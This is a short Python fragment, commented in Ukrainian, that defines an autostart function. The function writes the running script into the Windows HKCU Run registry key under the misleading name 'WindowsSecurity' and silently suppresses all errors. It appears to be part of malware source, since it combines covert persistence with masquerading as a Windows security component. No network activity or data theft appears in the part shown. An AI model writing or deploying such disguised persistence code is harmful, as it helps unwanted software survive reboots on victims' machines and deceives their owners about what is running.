# ---------- Автозапуск ----------
def add_to_startup():
    """Додає програму в автозапуск через реєстр"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ,
                          sys.executable + ' "' + __file__ + '"')
        winreg.CloseKey(key)
    except Exception:
        pass

